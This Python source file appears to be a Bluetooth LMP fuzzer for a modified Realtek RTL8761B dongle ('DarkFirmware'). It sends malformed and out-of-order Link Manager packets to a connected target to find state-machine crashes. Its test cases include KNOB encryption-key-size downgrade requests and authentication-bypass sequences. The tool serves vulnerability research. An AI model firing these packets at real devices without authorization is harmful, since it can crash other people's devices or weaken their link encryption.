#!/usr/bin/env python3
"""LMP State Machine Fuzzer for DarkFirmware RTL8761B.

Sends malformed, out-of-sequence, and boundary-case LMP packets to a connected
Bluetooth target to find state machine bugs (BrakTooth-style).

Usage:
    sudo python3 lmp_fuzzer.py [--mode MODE] [--conn-index N] [--delay MS]

Modes:
    state    State machine confusion test cases (default)
    random   Random opcode + random params
    sweep    Send every valid opcode with default params
    custom   Send a single custom packet (--opcode, --params)

Requires: Active ACL connection to target. DarkFirmware loaded.
"""

import sys
import os
import time
import json
import struct
import argparse
import signal

import usbbluetooth
from darkfirmware_utils import recv_raw_bytes, MARKER_AAAA
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

MARKER_AAAA = 0x41414141

class HCI_Cmd_VSC_Xeno_Send_LMP(Packet):
    name = "Xeno VSC Send LMP"
    fields_desc = [XStrLenField("data", b"", length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Xeno_Send_LMP, ogf=0x3f, ocf=0x0222)


# ---- Predefined State Machine Confusion Test Cases ----

STATE_CONFUSION_TESTS = [
    {
        "name": "enc_before_auth",
        "desc": "Encryption request before authentication",
        "packets": [
            bytes([0x0F, 0x01]),  # ENC_MODE_REQ (enable)
            bytes([0x10, 0x10]),  # ENC_KEY_SIZE_REQ (16 bytes)
        ],
    },
    {
        "name": "setup_before_features",
        "desc": "Setup complete before feature exchange",
        "packets": [bytes([0x1D])],  # SETUP_COMPLETE
    },
    {
        "name": "switch_during_enc",
        "desc": "Role switch during encryption setup",
        "packets": [
            bytes([0x0F, 0x01]),  # ENC_MODE_REQ
            bytes([0x13, 0x00, 0x00, 0x00, 0x00]),  # SWITCH_REQ instant=0
        ],
    },
    {
        "name": "unsolicited_sres",
        "desc": "SRES without AU_RAND challenge",
        "packets": [bytes([0x0C, 0x00, 0x00, 0x00, 0x00])],  # SRES with zeros
    },
    {
        "name": "rapid_feature_cycle",
        "desc": "Rapid features_req/setup_complete cycling",
        "packets": [
            bytes([0x27]),  # FEATURES_REQ
            bytes([0x1D]),  # SETUP_COMPLETE
            bytes([0x27]),  # FEATURES_REQ
            bytes([0x1D]),  # SETUP_COMPLETE
        ],
    },
    {
        "name": "key_size_after_start_enc",
        "desc": "Key size negotiation after encryption started",
        "packets": [
            bytes([0x11]) + os.urandom(16),  # START_ENC_REQ + random
            bytes([0x10, 0x01]),  # ENC_KEY_SIZE_REQ key=1
        ],
    },
    {
        "name": "ext_io_cap_truncated",
        "desc": "Extended IO capability with missing params",
        "packets": [bytes([0x7F, 0x0B])],  # Truncated (missing 3 params)
    },
    {
        "name": "ext_io_cap_unsolicited",
        "desc": "Unsolicited IO capability exchange",
        "packets": [
            bytes([0x7F, 0x0B, 0x03, 0x00, 0x00]),  # IO_CAP_REQ no_io, no_oob, no_mitm
            bytes([0x7F, 0x0C, 0x00, 0x00, 0x05]),  # IO_CAP_RES with invalid auth
        ],
    },
    {
        "name": "detach_zero_reason",
        "desc": "Detach with zero reason code",
        "packets": [bytes([0x07, 0x00])],  # DETACH reason=0
    },
    {
        "name": "stop_enc_without_start",
        "desc": "Stop encryption that was never started",
        "packets": [bytes([0x12])],  # STOP_ENC_REQ
    },
    {
        "name": "double_features_res",
        "desc": "Send features response without request",
        "packets": [
            bytes([0x28, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),  # All features set
        ],
    },
    {
        "name": "oversized_name_res",
        "desc": "Name response with max fragment",
        "packets": [
            bytes([0x02, 0x00, 0x0E]) + b"A" * 14,  # NAME_RES, offset=0, len=14
        ],
    },
    {
        "name": "zero_opcode",
        "desc": "Reserved opcode 0x00",
        "packets": [bytes([0x00])],
    },
    {
        "name": "max_opcode",
        "desc": "Maximum single-byte opcode",
        "packets": [bytes([0x7E])],  # Just below escape
    },
    {
        "name": "escape_invalid_ext",
        "desc": "Escape with invalid extended opcode",
        "packets": [bytes([0x7F, 0xFF])],  # Extended opcode 0xFF (undefined)
    },
    {
        "name": "knob_min_key",
        "desc": "KNOB: request 1-byte key",
        "packets": [bytes([0x10, 0x01])],  # KEY_SIZE_REQ key=1
    },
    {
        "name": "knob_zero_key",
        "desc": "KNOB: request 0-byte key (invalid)",
        "packets": [bytes([0x10, 0x00])],  # KEY_SIZE_REQ key=0
    },
    {
        "name": "au_rand_all_zeros",
        "desc": "Authentication with zero random",
        "packets": [bytes([0x0B]) + b'\x00' * 16],  # AU_RAND zeros
    },
    {
        "name": "in_rand_all_ff",
        "desc": "Initialization random all 0xFF",
        "packets": [bytes([0x08]) + b'\xFF' * 16],  # IN_RAND all-FF
    },
    {
        "name": "comb_key_zeros",
        "desc": "Combination key all zeros",
        "packets": [bytes([0x09]) + b'\x00' * 16],  # COMB_KEY zeros
    },
]


def find_realtek_device():
    controllers = usbbluetooth.list_controllers()
    for c in controllers:
        if ((c.vendor_id == 0x0bda and c.product_id == 0xa728) or
            (c.vendor_id == 0x0bda and c.product_id == 0xa729) or
            (c.vendor_id == 0x2c0a and c.product_id == 0x8761) or
            (c.vendor_id == 0x2550 and c.product_id == 0x8761) or
            (c.vendor_id == 0x2357 and c.product_id == 0x0604)):
            return c
    return None


def send_lmp(sock, conn_index, lmp_data):
    """Send LMP via VSC 0xFE22 with connection index."""
    payload = bytes([conn_index]) + lmp_data
    pkt = HCI_Hdr() / HCI_Command_Hdr(ogf=0x3f, ocf=0x0222) / HCI_Cmd_VSC_Xeno_Send_LMP(data=payload)
    try:
        resp = sock.sr1(pkt, verbose=0, timeout=2)
        return resp is not None
    except Exception:
        return False


def collect_events(sock, timeout_sec=1.0):
    """Collect LMP log events."""
    events = []
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        try:
            raw = recv_raw_bytes(sock, timeout_ms=300)
            if raw and len(raw) >= 3 and raw[0] == 0x04 and raw[1] == 0xFF:
                param_len = raw[2]
                params = raw[3:3+param_len]
                if len(params) >= 12:  # Min size for any DarkFirmware log
                    marker = struct.unpack_from("<I", params, 0)[0]
                    if marker == MARKER_AAAA:
                        events.append(params)
        except Exception:
            break
    return events


def check_connection_alive(sock):
    """Quick check if the dongle is still responsive."""
    try:
        from scapy.layers.bluetooth import HCI_Cmd_Read_BD_Addr
        pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_Read_BD_Addr()
        resp = sock.sr1(pkt, verbose=0, timeout=2)
        return resp is not None
    except Exception:
        return False


def run_state_tests(sock, conn_index, delay_ms, selected_tests=None):
    """Run state machine confusion test cases."""
    results = []
    tests = STATE_CONFUSION_TESTS
    if selected_tests:
        tests = [t for t in tests if t["name"] in selected_tests]

    for test in tests:
        name = test["name"]
        desc = test["desc"]
        print(f"\n[TEST] {name}: {desc}")

        test_result = {"name": name, "desc": desc, "sent": 0, "responses": 0, "crashed": False}

        for i, pdu in enumerate(test["packets"]):
            opcode = pdu[0]
            print(f"  TX[{i}]: opcode=0x{opcode:02x} data={pdu.hex()} ({len(pdu)}B)")

            ok = send_lmp(sock, conn_index, pdu)
            if not ok:
                print(f"  [!] Send failed — dongle may have crashed")
                test_result["crashed"] = True
                break

            test_result["sent"] += 1
            time.sleep(delay_ms / 1000.0)

            # Collect any responses
            events = collect_events(sock, timeout_sec=0.5)
            test_result["responses"] += len(events)
            for evt in events:
                payload = evt[0x18:0x34]
                if payload:
                    raw_byte = payload[4] if len(payload) > 4 else 0
                    decoded = raw_byte >> 1
                    print(f"  RX: opcode=0x{decoded:02x} raw=0x{raw_byte:02x} payload={payload[4:12].hex()}")

        # Check if dongle is still alive
        if not test_result["crashed"]:
            alive = check_connection_alive(sock)
            if not alive:
                print(f"  [!] Dongle became unresponsive after this test!")
                test_result["crashed"] = True

        status = "CRASH" if test_result["crashed"] else "OK"
        print(f"  Result: {status} (sent={test_result['sent']}, responses={test_result['responses']})")
        results.append(test_result)

        if test_result["crashed"]:
            print("[!] Stopping — dongle crashed. USB reset needed.")
            break

    return results


def run_sweep(sock, conn_index, delay_ms):
    """Send every valid LMP opcode (0x01-0x7E, 0x7F+ext) with minimal params."""
    results = []
    print("[*] Sweeping all LMP opcodes 0x01-0x7E...")

    for opcode in range(0x01, 0x7F):
        # Build minimal PDU (just opcode, no params)
        pdu = bytes([opcode])
        ok = send_lmp(sock, conn_index, pdu)

        events = collect_events(sock, timeout_sec=0.3)
        resp_count = len(events)

        status = "OK" if ok else "FAIL"
        print(f"  0x{opcode:02x}: {status} (responses={resp_count})")

        results.append({"opcode": opcode, "ok": ok, "responses": resp_count})
        time.sleep(delay_ms / 1000.0)

        if not ok:
            alive = check_connection_alive(sock)
            if not alive:
                print(f"  [!] Dongle crashed at opcode 0x{opcode:02x}!")
                break

    return results


def run_random(sock, conn_index, delay_ms, count=100):
    """Send random opcodes with random params."""
    results = []
    print(f"[*] Sending {count} random LMP packets...")

    for i in range(count):
        opcode = os.urandom(1)[0] % 0x7F + 1  # 1-126
        param_len = os.urandom(1)[0] % 16  # 0-15 random param bytes
        params = os.urandom(param_len)
        pdu = bytes([opcode]) + params

        ok = send_lmp(sock, conn_index, pdu)
        events = collect_events(sock, timeout_sec=0.2)

        if i % 10 == 0:
            print(f"  [{i}/{count}] Last: opcode=0x{opcode:02x} len={len(pdu)} ok={ok}")

        results.append({"opcode": opcode, "params": params.hex(), "ok": ok, "responses": len(events)})
        time.sleep(delay_ms / 1000.0)

        if not ok:
            alive = check_connection_alive(sock)
            if not alive:
                print(f"  [!] Dongle crashed at packet {i}, opcode=0x{opcode:02x}!")
                break

    return results


def main():
    parser = argparse.ArgumentParser(description="DarkFirmware LMP Fuzzer")
    parser.add_argument("--mode", choices=["state", "random", "sweep", "custom"], default="state")
    parser.add_argument("--conn-index", type=int, default=0)
    parser.add_argument("--delay", type=int, default=100, help="Delay between packets (ms)")
    parser.add_argument("--count", type=int, default=100, help="Number of random packets")
    parser.add_argument("--opcode", type=lambda x: int(x, 0), help="Custom opcode (hex)")
    parser.add_argument("--params", type=str, default="", help="Custom params (hex string)")
    parser.add_argument("--tests", nargs="*", help="Specific state tests to run")
    parser.add_argument("--output", metavar="FILE", help="Save results to JSON")
    args = parser.parse_args()

    ctrl = find_realtek_device()
    if ctrl is None:
        print("[!] No Realtek device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)
    print(f"[+] Connected to DarkFirmware dongle")
    print(f"[*] Mode: {args.mode}, conn_index={args.conn_index}, delay={args.delay}ms")
    print()

    if args.mode == "state":
        results = run_state_tests(sock, args.conn_index, args.delay, args.tests)
    elif args.mode == "sweep":
        results = run_sweep(sock, args.conn_index, args.delay)
    elif args.mode == "random":
        results = run_random(sock, args.conn_index, args.delay, args.count)
    elif args.mode == "custom":
        if args.opcode is None:
            print("[!] --opcode required for custom mode")
            sys.exit(1)
        params = bytes.fromhex(args.params) if args.params else b""
        pdu = bytes([args.opcode]) + params
        print(f"[*] Sending: {pdu.hex()}")
        ok = send_lmp(sock, args.conn_index, pdu)
        events = collect_events(sock, timeout_sec=2.0)
        results = [{"opcode": args.opcode, "params": params.hex(), "ok": ok, "responses": len(events)}]
        for evt in events:
            payload = evt[0x18:0x34]
            print(f"  RX: {payload.hex()}")

    # Summary
    print("\n" + "=" * 60)
    crashes = sum(1 for r in results if isinstance(r, dict) and r.get("crashed"))
    total = len(results)
    print(f"[*] Summary: {total} tests, {crashes} crashes")
    if crashes > 0:
        crashed_names = [r["name"] for r in results if isinstance(r, dict) and r.get("crashed")]
        print(f"    Crashed on: {', '.join(crashed_names)}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2, default=str)
        print(f"[+] Results saved to {args.output}")


if __name__ == "__main__":
    main()
